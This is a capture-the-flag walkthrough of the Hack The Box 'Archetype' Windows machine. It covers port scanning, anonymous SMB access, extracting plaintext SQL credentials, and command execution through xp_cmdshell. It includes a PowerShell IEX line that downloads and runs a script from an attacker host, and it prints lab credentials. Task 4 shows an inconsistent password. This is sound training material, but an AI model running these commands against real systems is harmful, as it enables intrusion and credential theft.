## Introduction

This report documents the completion of the Archetype challenge from Hack The Box. Through this exercise, participants will gain knowledge and practical experience in:

- Network scanning and enumeration
- SMB share access and enumeration
- Microsoft SQL Server exploitation
- Windows privilege escalation techniques
- Credential harvesting and lateral movement
- Command execution via SQL Server

## Task Breakdown

### Task 1: Which TCP port is hosting a database server?

**Question:** Which TCP port is hosting a database server?

**Solution:**
```bash
nmap -sV -p- --min-rate=1000 10.10.10.x
```

This command performs a comprehensive port scan with service version detection, revealing port 1433 running Microsoft SQL Server.

**Importance:** Identifying open ports and services is the first critical step in penetration testing, allowing us to discover potential attack vectors.

#### Troubleshooting Common Issues

```bash
nmap -sV -p- --min-rate=1000 10.129.141.44
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 17:58 MDT
Warning: 10.129.141.44 giving up on port because retransmission cap hit (10).
```
This warning indicates that:

1. Nmap attempted to send packets to a specific port on the target IP (10.129.141.44)
2. Nmap didn't receive a response after 10 retransmission attempts (the default cap)
3. As a result, Nmap "gave up" on that particular port and marked it as filtered/uncertain

This typically happens when:

- Packets are being dropped by a firewall
- Network congestion is causing packet loss
- The target host is rate-limiting responses
- There's an unstable network connection between you and the target

When Nmap hits the retransmission cap, it can't definitively determine if the port is open, closed, or filtered, which might lead to incomplete scan results. You might want to:

1. Try running the scan again to see if it was a temporary network issue
2. Use the `--max-retries` parameter to increase the retransmission attempts
3. Slow down the scan with `--min-rate` set to a lower value to reduce network congestion

This warning doesn't necessarily mean the scan failed completely - it just indicates that some ports might not have been accurately classified.

### Task 2: What is the name of the non-Administrative share available over SMB?

**Question:** What is the name of the non-Administrative share available over SMB?

**Solution:**
```bash
smbclient -L \\10.10.10.x -N
```
In the selected code `smbclient -L \\10.10.10.x -N`, the double backslashes (`\\`) have special significance:

The double backslashes are used to specify the UNC (Universal Naming Convention) path to the SMB server. In Windows networking and SMB protocol:

1. The first backslash indicates the beginning of a network path
2. The second backslash is needed because backslash is an escape character in many command-line environments

This is the standard syntax for accessing network shares in Windows and SMB protocols. The format is `\\server\share` where:
- `\\server` specifies the server name or IP address (in this case, 10.10.10.x)
- The `-L` parameter tells smbclient to list the available shares on that server

If you were using this command in a Windows command prompt, you would only need a single backslash, but in Linux/Unix environments (including most penetration testing tools), you need to escape the backslash with another backslash.

This is particularly important in the context of this CTF because it shows you're properly formatting the SMB connection string to enumerate the target's SMB shares, which is a critical step in the reconnaissance phase of the attack.


This command lists available SMB shares without requiring authentication (-N), revealing the "backups" share among standard administrative shares.


Looking at the SMB shares output:

```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

You should identify "backups" as the non-administrative share because:

1. The other three shares (ADMIN$, C$, and IPC$) are standard Windows administrative shares:
   - ADMIN$ - Maps to the Windows directory, used for remote administration
   - C$ - Maps to the C: drive root, a default administrative share
   - IPC$ - Inter-Process Communication share, used for named pipes

2. The "backups" share:
   - Doesn't have the $ suffix (administrative shares typically end with $)
   - Doesn't have a "Remote Admin" or "Default share" comment
   - Is clearly a custom share created for a specific purpose
   - Has a name suggesting it contains backup data (potentially sensitive)

In penetration testing, custom shares like "backups" are high-value targets because they:
- Often contain sensitive data
- May have weaker permissions than administrative shares
- Are created for specific business purposes
- Could contain configuration files, credentials, or other valuable information

This is why "backups" is the correct answer to the question about the non-administrative share.

The error messages in the selected code:

```bash
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.141.44 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
These messages tell you:

1. After successfully listing the shares, `smbclient` is attempting to reconnect using SMB1 protocol specifically to list workgroups (not shares).

2. This secondary connection failed with error `NT_STATUS_RESOURCE_NAME_NOT_FOUND`, which indicates the server couldn't find the requested resource name (in this case, likely the workgroup name).

3. As a result, `smbclient` couldn't retrieve the workgroup listing.

Importantly, these errors are **not** preventing you from accessing the shares themselves. They only affect the workgroup listing functionality, which is separate from share access. This is a common misunderstanding.

The key points:
- The share listing was successful (you can see ADMIN$, C$, IPC$, and backups)
- The error only occurs when trying to list workgroups, which is not necessary for accessing shares
- You can still connect to and access the "backups" share despite these errors
- These messages often appear in penetration testing scenarios and can be safely ignored if your goal is to access the shares

This is valuable information because it shows you can proceed with connecting to the "backups" share even though the workgroup listing failed.

**Importance:** Discovering accessible SMB shares can provide valuable information and potential entry points into the target system.

### Task 3: What is the password identified in the file on the SMB share?

**Question:** What is the password identified in the file on the SMB share?

**Solution:**
```bash
smbclient \\\\10.10.10.x\\backups -N
get prod.dtsConfig
exit
```
this command downloads the configuration file from the SMB share. Go to the directory where the file was downloaded and view its contents with:

```bash
cat prod.dtsConfig
```
the contents of the file will look like this:

```bash
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
Key components:

1. **File Type**: This is a DTS (Data Transformation Services) configuration file, used by Microsoft SQL Server Integration Services (SSIS) for ETL (Extract, Transform, Load) operations.

2. **Generation Information**: The file was generated on January 20, 2019, as indicated by the `GeneratedDate` attribute.

3. **Configuration Type**: It's configuring a property (`ConfiguredType="Property"`) for a connection string.

4. **Path**: The configuration is for a connection destination (`Path="\Package.Connections[Destination].Properties[ConnectionString]"`).

5. **Connection String**: The most important part contains several critical pieces of information:
   - `Data Source=.` - The period indicates a local SQL Server instance
   - `Password=M3g4c0rp123` - The plaintext password for the SQL Server account
   - `User ID=ARCHETYPE\sql_svc` - The username in domain\user format
   - `Initial Catalog=Catalog` - The database name
   - `Provider=SQLNCLI10.1` - SQL Server Native Client 10.1 provider
   - `Persist Security Info=True` - Security information will be retained
   - `Auto Translate=False` - Character translation is disabled

From a penetration testing perspective, the most valuable information is:
- Username: `ARCHETYPE\sql_svc`
- Password: `M3g4c0rp123`

This is a significant security issue because:
1. The credentials are stored in plaintext
2. The file is accessible via an SMB share without authentication
3. These credentials likely provide access to the SQL Server running on port 1433
4. The domain username format (`ARCHETYPE\sql_svc`) suggests these might be domain credentials that could be used for lateral movement

This finding demonstrates a common security mistake: storing sensitive credentials in configuration files that aren't properly secured. In a real-world scenario, this could lead to unauthorized database access and potentially further compromise of the system.

These commands connect to the backups share, download the configuration file, and reveal credentials stored in plaintext.

**Importance:** This demonstrates how improper credential storage can lead to security breaches, as sensitive information is often left in configuration files.

**Troubleshooting Common Issues**

If you're seeing the error message:

```bash
smbclient \\\\10.129.141.44\\backups -N
do_connect: Connection to 10.129.141.44 failed (Error NT_STATUS_IO_TIMEOUT)
```

This indicates a connection timeout when trying to connect to the "backups" share. This is different from the previous error about workgroup listing - this is actually preventing you from accessing the share. Here's what you can do:

1. **Check your VPN connection** - Make sure your VPN to the HTB network is still active and stable. Connection timeouts often occur when the VPN connection is unstable.

2. **Verify the target is still up** - Try pinging the target to see if it's responsive:
   ```bash
   ping 10.129.141.44
   ```

3. **Try different SMB protocol versions** - Sometimes older or newer SMB versions work better:
   ```bash
   smbclient \\\\10.129.141.44\\backups -N --option='client min protocol=SMB2'
   ```
   or
   ```bash
   smbclient \\\\10.129.141.44\\backups -N --option='client max protocol=SMB3'
   ```

4. **Try with explicit credentials** - Use guest account or null session:
   ```bash
   smbclient \\\\10.129.141.44\\backups -U 'guest%'
   ```
   (This uses 'guest' username with empty password)

5. **Check if the machine needs to be reset** - In HTB, sometimes machines need to be reset if they've been used for a while:
   - Go to the machine page on the HTB website
   - Click "Reset" and wait for the machine to restart
   - Try connecting again with the new IP address if it changed


### Task 4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

**Question:** What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

**Solution:**
```bash
mssqlclient.py ARCHETYPE/sql_svc:Password123@10.10.10.x -windows-auth
```
This Impacket script allows for authenticated connections to MSSQL servers using the credentials discovered in the previous step.

**Importance:** Understanding specialized tools for database access is crucial for penetration testing against database servers.

**Troubleshooting Common Issues**

If you're seeing the error message:

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
mssqlclient.py: command not found
```
This error indicates that your system cannot find the `mssqlclient.py` script. This is happening because:

1. **The Impacket tools are not installed** on your system, or
2. **The Impacket scripts are not in your PATH**, or
3. **You're not running the command from the correct directory**

Here's how to fix it:

#### Option 1: Install Impacket if it's not installed
```bash
## Using pip
pip install impacket

## Or for the latest version from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

Using a virtual environment for Python packages like Impacket is a best practice. Here's how to set up a virtual environment and install Impacket:

```bash
# Create a virtual environment
python3 -m venv impacket-env
```

On Kali Linux, you might need to install the virtual environment package:

```bash
sudo apt install python3-venv
```
```bash
# Activate the virtual environment
# On Linux/macOS:
source impacket-env/bin/activate
# On Windows:
# impacket-env\Scripts\activate

# Install Impacket in the virtual environment
pip install impacket

# Or for the latest version from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

# Now you can run mssqlclient.py
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
````

#### Option 2: Specify the full path to the script
If Impacket is installed but not in your PATH:
```bash
## Find where the script is located
find / -name mssqlclient.py 2>/dev/null

## Then use the full path
/path/to/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

#### Option 3: Navigate to the Impacket examples directory
```bash
## If you installed from GitHub
cd impacket/examples
python mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth

## If you installed via pip, the examples might be in:
cd /usr/share/doc/python3-impacket/examples/
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

#### Option 4: Use Python to run the script
```bash
python /path/to/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

In Kali Linux specifically, you might need to use:
```bash
/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.141.44 -windows-auth
```

This is a common issue when working with penetration testing tools, as many specialized scripts require specific installation steps or need to be run from particular directories.


### Task 5: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**Question:** What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**Solution:**

```sql
EXEC xp_cmdshell 'whoami'
```

The xp_cmdshell extended stored procedure allows execution of operating system commands from within SQL Server.

**Importance:** This highlights how misconfigured database servers can be leveraged to gain command execution on the underlying operating system.

### Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?

**Question:** What script can be used in order to search possible paths to escalate privileges on Windows hosts?

**Solution:** WinPEAS

WinPEAS (Windows Privilege Escalation Awesome Scripts) is a powerful enumeration script that automatically searches for possible privilege escalation paths on Windows systems.

```bash
# First, set up a listener on the attack machine
nc -lvnp 4444

# Then, using xp_cmdshell, download and execute WinPEAS
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.x/winPEAS.ps1''); Invoke-WinPEAS"'
```

**Importance:** Automated privilege escalation scripts are essential for efficiently identifying potential escalation paths in complex Windows environments.

### Task 7: What file contains the administrator's password?

**Question:** What file contains the administrator's password?

**Solution:**
```bash
# Using xp_cmdshell to search for interesting files
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
```

The PowerShell history file contains previously executed commands, including those with administrator credentials.

**Importance:** This demonstrates the importance of proper credential handling and the risks of leaving command history files accessible.

## Appendix: Command Outputs

### Task 1 Command Output
```
Starting Nmap 7.91 ( https://nmap.org )
Nmap scan report for 10.10.10.x
Host is up (0.089s latency).
Not shown: 65523 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00
```

**Key observations:**
- Port 1433 is running Microsoft SQL Server 2017
- The target is running Windows Server 2019
- SMB services are available on ports 139 and 445

### Task 2 Command Output
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

**Key observations:**
- "backups" is the non-administrative share
- Standard administrative shares (ADMIN$, C$, IPC$) are also available

### Task 3 Command Output
```
<DTSConfigurationFileInfo>
   <Version>...</Version>
   <UserName>...</UserName>
</DTSConfigurationFileInfo>
<Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
   <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Auto Translate=False;</ConfiguredValue>
</Configuration>
```

**Key observations:**
- Username: ARCHETYPE\sql_svc
- Password: M3g4c0rp123
- These credentials are for SQL Server access

## Summary

This CTF challenge provided hands-on experience with Windows server penetration testing. The most valuable lessons from this exercise include:

1. The importance of thorough enumeration of network services
2. How insecure file storage can lead to credential exposure
3. Leveraging database server misconfigurations for command execution
4. Using PowerShell history files for post-exploitation intelligence gathering
5. The critical nature of proper credential management

These skills are directly applicable to real-world scenarios such as internal network penetration tests and security assessments of Windows-based environments.
`
